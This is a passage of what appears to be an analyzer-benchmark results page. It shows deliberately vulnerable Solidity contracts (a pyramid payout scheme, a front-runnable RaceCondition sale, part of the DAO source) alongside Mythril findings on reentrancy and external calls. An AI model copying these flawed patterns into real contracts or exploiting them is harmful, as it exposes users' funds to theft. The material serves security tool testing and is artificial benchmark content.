                <span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;=</span> <span class="mi">50</span> <span class="kc">ether</span><span class="p">)</span> <span class="n">_fee</span> <span class="o">/=</span> <span class="mi">2</span><span class="p">;</span>

                <span class="n">addPayout</span><span class="p">(</span><span class="n">_fee</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="c1">//Function called for valid tx to the contract </span>
        <span class="kd">function</span> <span class="n">addPayout</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_fee</span><span class="p">)</span> <span class="kr">private</span> <span class="p">{</span>
                <span class="c1">//Adds new address to participant array</span>
                <span class="n">participants</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="n">Participant</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">*</span> <span class="n">pyramidMultiplier</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span><span class="p">));</span>

                <span class="c1">//These statements ensure a quicker payout system to later pyramid entrants, so the pyramid has a longer lifespan</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">participants</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">10</span><span class="p">)</span> <span class="n">pyramidMultiplier</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span>
                <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">participants</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">25</span><span class="p">)</span> <span class="n">pyramidMultiplier</span> <span class="o">=</span> <span class="mi">150</span><span class="p">;</span>

                <span class="c1">// collect fees and update contract balance</span>
                <span class="nb">balance</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="n">_fee</span><span class="p">))</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>
                <span class="n">collectedFees</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">*</span> <span class="n">_fee</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100</span><span class="p">;</span>

                <span class="c1">//Pays earlier participiants if balance sufficient</span>
                <span class="k">while</span> <span class="p">(</span><span class="nb">balance</span> <span class="o">&gt;</span> <span class="n">participants</span><span class="p">[</span><span class="n">payoutOrder</span><span class="p">].</span><span class="n">payout</span><span class="p">)</span> <span class="p">{</span>
                        <span class="kt">uint</span> <span class="n">payoutToSend</span> <span class="o">=</span> <span class="n">participants</span><span class="p">[</span><span class="n">payoutOrder</span><span class="p">].</span><span class="n">payout</span><span class="p">;</span>
                        <span class="n">participants</span><span class="p">[</span><span class="n">payoutOrder</span><span class="p">].</span><span class="n">etherAddress</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payoutToSend</span><span class="p">);</span>

                        <span class="nb">balance</span> <span class="o">-=</span> <span class="n">participants</span><span class="p">[</span><span class="n">payoutOrder</span><span class="p">].</span><span class="n">payout</span><span class="p">;</span>
                        <span class="n">payoutOrder</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>

        <span class="c1">//Fee functions for creator</span>
        <span class="kd">function</span> <span class="n">collectAllFees</span><span class="p">()</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">collectedFees</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>

                <span class="n">creator</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">collectedFees</span><span class="p">);</span>
                <span class="n">collectedFees</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">collectFeesInEther</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_amt</span><span class="p">)</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="n">_amt</span> <span class="o">*=</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">_amt</span> <span class="o">&gt;</span> <span class="n">collectedFees</span><span class="p">)</span> <span class="n">collectAllFees</span><span class="p">();</span>

                <span class="k">if</span> <span class="p">(</span><span class="n">collectedFees</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>

                <span class="n">creator</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">_amt</span><span class="p">);</span>
                <span class="n">collectedFees</span> <span class="o">-=</span> <span class="n">_amt</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">collectPercentOfFees</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_pcent</span><span class="p">)</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">collectedFees</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">_pcent</span> <span class="o">&gt;</span> <span class="mi">100</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>

                <span class="kt">uint</span> <span class="n">feesToCollect</span> <span class="o">=</span> <span class="n">collectedFees</span> <span class="o">/</span> <span class="mi">100</span> <span class="o">*</span> <span class="n">_pcent</span><span class="p">;</span>
                <span class="n">creator</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">feesToCollect</span><span class="p">);</span>
                <span class="n">collectedFees</span> <span class="o">-=</span> <span class="n">feesToCollect</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">//Functions for changing variables related to the contract</span>
        <span class="kd">function</span> <span class="n">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="n">creator</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">changeMultiplier</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_mult</span><span class="p">)</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">_mult</span> <span class="o">&gt;</span> <span class="mi">300</span> <span class="o">||</span> <span class="n">_mult</span> <span class="o">&lt;</span> <span class="mi">120</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>

                <span class="n">pyramidMultiplier</span> <span class="o">=</span> <span class="n">_mult</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">changeFeePercentage</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_fee</span><span class="p">)</span> <span class="n">onlyowner</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">_fee</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span>

                <span class="n">feePercent</span> <span class="o">=</span> <span class="n">_fee</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="c1">//Functions to provide information to end-user using JSON interface or other interfaces</span>
        <span class="kd">function</span> <span class="n">currentMultiplier</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">multiplier</span><span class="p">,</span> <span class="kt">string</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">multiplier</span> <span class="o">=</span> <span class="n">pyramidMultiplier</span><span class="p">;</span>
                <span class="n">info</span> <span class="o">=</span> <span class="s">&#39;This multiplier applies to you as soon as transaction is received, may be lowered to hasten payouts or increased if payouts are fast enough. Due to no float or decimals, multiplier is x100 for a fractional multiplier e.g. 250 is actually a 2.5x multiplier. Capped at 3x max and 1.2x min.&#39;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">currentFeePercentage</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">fee</span><span class="p">,</span> <span class="kt">string</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fee</span> <span class="o">=</span> <span class="n">feePercent</span><span class="p">;</span>
                <span class="n">info</span> <span class="o">=</span> <span class="s">&#39;Shown in % form. Fee is halved(50%) for amounts equal or greater than 50 ethers. (Fee may change, but is capped to a maximum of 10%)&#39;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">currentPyramidBalanceApproximately</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">pyramidBalance</span><span class="p">,</span> <span class="kt">string</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">pyramidBalance</span> <span class="o">=</span> <span class="nb">balance</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
                <span class="n">info</span> <span class="o">=</span> <span class="s">&#39;All balance values are measured in Ethers, note that due to no decimal placing, these values show up as integers only, within the contract itself you will get the exact decimal value you are supposed to&#39;</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">nextPayoutWhenPyramidBalanceTotalsApproximately</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">balancePayout</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">balancePayout</span> <span class="o">=</span> <span class="n">participants</span><span class="p">[</span><span class="n">payoutOrder</span><span class="p">].</span><span class="n">payout</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">feesSeperateFromBalanceApproximately</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">fees</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">fees</span> <span class="o">=</span> <span class="n">collectedFees</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">totalParticipants</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">count</span> <span class="o">=</span> <span class="n">participants</span><span class="p">.</span><span class="n">length</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">numberOfParticipantsWaitingForPayout</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">uint</span> <span class="n">count</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">count</span> <span class="o">=</span> <span class="n">participants</span><span class="p">.</span><span class="n">length</span> <span class="o">-</span> <span class="n">payoutOrder</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="kd">function</span> <span class="n">participantDetails</span><span class="p">(</span><span class="kt">uint</span> <span class="n">orderInPyramid</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span><span class="p">(</span><span class="kt">address</span> <span class="n">Address</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">Payout</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">orderInPyramid</span> <span class="o">&lt;=</span> <span class="n">participants</span><span class="p">.</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                        <span class="n">Address</span> <span class="o">=</span> <span class="n">participants</span><span class="p">[</span><span class="n">orderInPyramid</span><span class="p">].</span><span class="n">etherAddress</span><span class="p">;</span>
                        <span class="n">Payout</span> <span class="o">=</span> <span class="n">participants</span><span class="p">[</span><span class="n">orderInPyramid</span><span class="p">].</span><span class="n">payout</span> <span class="o">/</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">;</span>
                <span class="p">}</span>
        <span class="p">}</span>
<span class="p">}</span>
</pre></div>

          <hr>
    <h3 id=race_condition/RaceCondition>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//race_condition/RaceCondition.sol">race_condition/RaceCondition</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Missing Constructor</td>
	        <td style="background-color:
		   rgba(80, 200, 120, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/True-Positive">True Positive</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="kr">pragma solidity</span> <span class="o">^</span><span class="mf">0.4</span><span class="p">.</span><span class="mi">16</span><span class="p">;</span>

<span class="c1">// https://github.com/ethereum/EIPs/issues/20</span>
<span class="kd">contract</span> <span class="n">ERC20</span> <span class="p">{</span>
    <span class="kd">function</span> <span class="n">totalSupply</span><span class="p">()</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">totalSupply</span><span class="p">);</span>
    <span class="kd">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="nb">balance</span><span class="p">);</span>
    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>
    <span class="kd">function</span> <span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>
    <span class="kd">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">_spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>
    <span class="kd">function</span> <span class="n">allowance</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_spender</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">remaining</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">Approval</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_owner</span><span class="p">,</span> <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_spender</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">contract</span> <span class="n">RaceCondition</span><span class="p">{</span>
    <span class="kt">address</span> <span class="kr">private</span> <span class="n">owner</span><span class="p">;</span>
    <span class="kt">uint</span> <span class="kr">public</span> <span class="n">price</span><span class="p">;</span>
    <span class="n">ERC20</span> <span class="n">token</span><span class="p">;</span>

    <span class="kd">function</span> <span class="n">RaceCondition</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_price</span><span class="p">,</span> <span class="n">ERC20</span> <span class="n">_token</span><span class="p">)</span>
        <span class="kr">public</span> 
    <span class="p">{</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
        <span class="n">price</span> <span class="o">=</span> <span class="n">_price</span><span class="p">;</span>
        <span class="n">token</span> <span class="o">=</span> <span class="n">_token</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="c1">// If the owner sees someone calls buy</span>
    <span class="c1">// he can call changePrice to set a new price</span>
    <span class="c1">// If his transaction is mined first, he can</span>
    <span class="c1">// receive more tokens than excepted by the new buyer</span>
    <span class="kd">function</span> <span class="n">buy</span><span class="p">(</span><span class="kt">uint</span> <span class="n">new_price</span><span class="p">)</span> <span class="kr">payable</span>
        <span class="kr">public</span>
    <span class="p">{</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;=</span> <span class="n">price</span><span class="p">);</span>

        <span class="c1">// we assume that the RaceCondition contract</span>
        <span class="c1">// has enough allowance</span>
        <span class="n">token</span><span class="p">.</span><span class="n">transferFrom</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">owner</span><span class="p">,</span> <span class="n">price</span><span class="p">);</span>

        <span class="n">price</span> <span class="o">=</span> <span class="n">new_price</span><span class="p">;</span>
        <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg.sender</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">changePrice</span><span class="p">(</span><span class="kt">uint</span> <span class="n">new_price</span><span class="p">){</span>
        <span class="nf">require</span><span class="p">(</span><span class="nb">msg.sender</span> <span class="o">==</span> <span class="n">owner</span><span class="p">);</span>
        <span class="n">price</span> <span class="o">=</span> <span class="n">new_price</span><span class="p">;</span> 
    <span class="p">}</span>

<span class="p">}</span>
</pre></div>

          <h4>Mythril Report</h4>
                          <h5>Location</h5>
           <pre>Line 39: token.transferFrom(msg.sender, owner, price)</pre>
                  <h5>Issue Message call to external contract (Informational)</h5>
         This contract executes a message call to to another contract. Make sure that the called contract is trusted and does not execute user-supplied code.
                          <h5>Location</h5>
           <pre>Line 41: price = new_price</pre>
                  <h5>Issue State change after external call (Warning)</h5>
         The contract account state is changed after an external call. Consider that the called contract could re-enter the function before this state change takes place. This can lead to business logic vulnerabilities.
                          <h5>Location</h5>
           <pre>Line 42: owner = msg.sender</pre>
                  <h5>Issue State change after external call (Warning)</h5>
         The contract account state is changed after an external call. Consider that the called contract could re-enter the function before this state change takes place. This can lead to business logic vulnerabilities.
                <hr>
    <h3 id=reentrancy/DAO_source_code/DAO>
      <a href="https://github.com/trailofbits/not-so-smart-contracts/tree/master//reentrancy/DAO_source_code/DAO.sol">reentrancy/DAO_source_code/DAO</a>
    </h3>
    <table>
      <tr style="font-weight: bold">
        <td>Bug Type</td>
	          <td colspan="2">
          Mythril
          <br>
          <span style="font-size: 10px">v0.18.11</span>
      </tr>
      <tr>
        <td>Reentrancy</td>
	        <td style="background-color:
		   rgba(128, 128, 128, .4)">
	  <a href="https://github.com/EthereumAnalysisBenchmarks/evm-analyzer-bench-suites/wiki/Unconfigured">Unconfigured</a></td>
      </tr>
    </table>
    <h4>Source Code</h4>
    <div class="highlight"><pre><span></span><span class="c1">// 0xbb9bc244d798123fde783fcc1c72d3bb8c189413#code</span>

<span class="cm">/*</span>

<span class="cm">- Bytecode Verification performed was compared on second iteration -</span>

<span class="cm">This file is part of the DAO.</span>

<span class="cm">The DAO is free software: you can redistribute it and/or modify</span>
<span class="cm">it under the terms of the GNU lesser General Public License as published by</span>
<span class="cm">the Free Software Foundation, either version 3 of the License, or</span>
<span class="cm">(at your option) any later version.</span>

<span class="cm">The DAO is distributed in the hope that it will be useful,</span>
<span class="cm">but WITHOUT ANY WARRANTY; without even the implied warranty of</span>
<span class="cm">MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span>
<span class="cm">GNU lesser General Public License for more details.</span>

<span class="cm">You should have received a copy of the GNU lesser General Public License</span>
<span class="cm">along with the DAO.  If not, see &lt;http://www.gnu.org/licenses/&gt;.</span>
<span class="cm">*/</span>


<span class="cm">/*</span>
<span class="cm">Basic, standardized Token contract with no &quot;premine&quot;. Defines the functions to</span>
<span class="cm">check token balances, send tokens, send tokens on behalf of a 3rd party and the</span>
<span class="cm">corresponding approval process. Tokens need to be created by a derived</span>
<span class="cm">contract (e.g. TokenCreation.sol).</span>

<span class="cm">Thank you ConsenSys, this contract originated from:</span>
<span class="cm">https://github.com/ConsenSys/Tokens/blob/master/Token_Contracts/contracts/Standard_Token.sol</span>
<span class="cm">Which is itself based on the Ethereum standardized contract APIs:</span>
<span class="cm">https://github.com/ethereum/wiki/wiki/Standardized_Contract_APIs</span>
<span class="cm">*/</span>

<span class="c1">/// </span><span class="cs">@title</span><span class="c1"> Standard Token Contract.</span>

<span class="kd">contract</span> <span class="n">TokenInterface</span> <span class="p">{</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
    <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kd">mapping</span> <span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint256</span><span class="p">))</span> <span class="n">allowed</span><span class="p">;</span>

    <span class="c1">/// Total amount of tokens</span>
    <span class="kt">uint256</span> <span class="kr">public</span> <span class="n">totalSupply</span><span class="p">;</span>

    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _owner The address from which the balance will be retrieved</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> The balance</span>
    <span class="kd">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="nb">balance</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Send `_amount` tokens to `_to` from `msg.sender`</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _to The address of the recipient</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of tokens to be transferred</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the transfer was successful or not</span>
    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> Send `_amount` tokens to `_to` from `_from` on the condition it</span>
    <span class="c1">/// is approved by `_from`</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _from The address of the origin of the transfer</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _to The address of the recipient</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of tokens to be transferred</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the transfer was successful or not</span>
    <span class="kd">function</span> <span class="n">transferFrom</span><span class="p">(</span><span class="kt">address</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@notice</span><span class="c1"> `msg.sender` approves `_spender` to spend `_amount` tokens on</span>
    <span class="c1">/// its behalf</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _spender The address of the account able to transfer the tokens</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _amount The amount of tokens to be approved for transfer</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Whether the approval was successful or not</span>
    <span class="kd">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">_spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">);</span>

    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _owner The address of the account owning tokens</span>
    <span class="c1">/// </span><span class="cs">@param</span><span class="c1"> _spender The address of the account able to transfer the tokens</span>
    <span class="c1">/// </span><span class="cs">@return</span><span class="c1"> Amount of remaining tokens of _owner that _spender is allowed</span>
    <span class="c1">/// to spend</span>
    <span class="kd">function</span> <span class="n">allowance</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_owner</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_spender</span>
    <span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">remaining</span><span class="p">);</span>

    <span class="kd">event</span> <span class="n">Transfer</span><span class="p">(</span><span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_from</span><span class="p">,</span> <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">);</span>
    <span class="kd">event</span> <span class="n">Approval</span><span class="p">(</span>
        <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_owner</span><span class="p">,</span>
        <span class="kt">address</span> <span class="kr">indexed</span> <span class="n">_spender</span><span class="p">,</span>
        <span class="kt">uint256</span> <span class="n">_amount</span>
    <span class="p">);</span>
<span class="p">}</span>


<span class="kd">contract</span> <span class="n">Token</span> <span class="kr">is</span> <span class="n">TokenInterface</span> <span class="p">{</span>
    <span class="c1">// Protects users by preventing the execution of method calls that</span>
    <span class="c1">// inadvertently also transferred ether</span>
    <span class="kd">modifier</span> <span class="n">noEther</span><span class="p">()</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">msg.value</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="k">throw</span><span class="p">;</span> <span class="kr">_</span><span class="p">}</span>

    <span class="kd">function</span> <span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="kr">constant</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_owner</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span> <span class="o">&amp;&amp;</span> <span class="n">_amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">balances</span><span class="p">[</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
            <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
            <span class="n">Transfer</span><span class="p">(</span><span class="nb">msg.sender</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
           <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">transferFrom</span><span class="p">(</span>
        <span class="kt">address</span> <span class="n">_from</span><span class="p">,</span>
        <span class="kt">address</span> <span class="n">_to</span><span class="p">,</span>
        <span class="kt">uint256</span> <span class="n">_amount</span>
    <span class="p">)</span> <span class="n">noEther</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span>
            <span class="o">&amp;&amp;</span> <span class="n">allowed</span><span class="p">[</span><span class="n">_from</span><span class="p">][</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">_amount</span>
            <span class="o">&amp;&amp;</span> <span class="n">_amount</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>

            <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_amount</span><span class="p">;</span>
            <span class="n">balances</span><span class="p">[</span><span class="n">_from</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
            <span class="n">allowed</span><span class="p">[</span><span class="n">_from</span><span class="p">][</span><span class="nb">msg.sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_amount</span><span class="p">;</span>
            <span class="n">Transfer</span><span class="p">(</span><span class="n">_from</span><span class="p">,</span> <span class="n">_to</span><span class="p">,</span> <span class="n">_amount</span><span class="p">);</span>
            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="kd">function</span> <span class="n">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">_spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">_amount</span><span class="p">)</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">)</span> <span class="p">{</span>
